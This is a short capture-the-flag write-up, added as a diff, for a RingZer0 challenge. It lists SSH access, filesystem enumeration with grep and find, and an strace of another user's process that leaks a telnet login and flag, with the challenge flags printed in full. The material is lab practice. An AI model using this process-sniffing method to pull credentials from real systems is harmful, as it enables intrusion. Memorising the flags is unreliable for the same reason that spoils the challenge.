@@ -1,0 +1,31 @@
+# User     : ltcastelnuovo
+# Challenge: https://ringzer0ctf.com/challenges/91
+# Objective: Neo is not alone!
+
+ssh neo@challenges.ringzer0team.com -p 10091
+pass: FLAG-314df4d411ae37f16f590f65da99f3b6
+
+1. ssh into server
+2. grep -r "neo" / 2>/dev/null
+3. find / -readable -and -user neo 2>/dev/null
+3. find / -type f -exec grep -lE 'neo' {} \; 2>&-
+3. find / -type f -readable ! -empty '(' -user neo -o -group neo ')' 2>&-
+
+this didn't show anything special
+
+4. ps aux | grep -i neo
+```
+root       92192  0.0  0.3  11008  3308 ?        S    Oct09   0:00 su neo -c /bin/monitor
+neo        92201  0.0  0.0   2344   564 ?        Ss   Oct09   0:01 /bin/monitor
+```
+
+5. strace -p 92201 (read process sytemcalls)
+```
+write(-1, "telnet 127.0.0.1 23\n", 20)  = -1 EBADF (Bad file descriptor)
+write(-1, "user\n", 5)                  = -1 EBADF (Bad file descriptor)
+write(-1, "FLAG-a4UVY5HJQO5ddLc5wtBps48A3\n", 31) = -1 EBADF (Bad file descriptor)
+write(-1, "get-cpuinfo\n", 12)          = -1 EBADF (Bad file descriptor)
+clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=10, tv_nsec=0}
+```
+
+FLAG-a4UVY5HJQO5ddLc5wtBps48A3
